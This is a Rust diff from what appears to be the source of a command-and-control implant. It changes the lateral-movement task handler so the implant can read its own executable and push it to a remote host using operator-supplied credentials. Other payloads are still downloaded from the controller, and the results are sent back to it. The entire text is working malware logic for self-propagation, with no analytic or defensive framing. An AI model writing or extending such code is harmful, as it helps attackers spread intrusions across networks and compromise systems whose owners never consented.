@@ -1138,14 +1138,19 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let pass         = j["pass"].as_str().unwrap_or("").to_string();
             let cmd          = j["cmd"].as_str().unwrap_or("").to_string();
             let payload_name = j["payload"].as_str().unwrap_or("").to_string();
-            let data: Vec<u8> = if !payload_name.is_empty() {
-                t.download_file(&payload_name)
+            let (data, local_path): (Vec<u8>, String) = if payload_name.eq_ignore_ascii_case("self") {
+                let self_path = std::env::current_exe().unwrap_or_default();
+                let bytes = std::fs::read(&self_path).unwrap_or_default();
+                (bytes, self_path.to_string_lossy().into_owned())
+            } else if !payload_name.is_empty() {
+                (t.download_file(&payload_name), String::new())
             } else if !cmd.is_empty() {
-                std::fs::read(&cmd).unwrap_or_default()
+                (std::fs::read(&cmd).unwrap_or_default(), cmd.clone())
             } else {
-                vec![]
+                (vec![], String::new())
             };
-            match crate::lateral::run_lateral(&method, &host, &data, &cmd, &user, &pass) {
+            let effective_cmd = if !local_path.is_empty() { local_path } else { cmd };
+            match crate::lateral::run_lateral(&method, &host, &data, &effective_cmd, &user, &pass) {
                 Ok(out)  => t.send_result(task.id, &out, ""),
                 Err(err) => t.send_result(task.id, "", &err),
             }
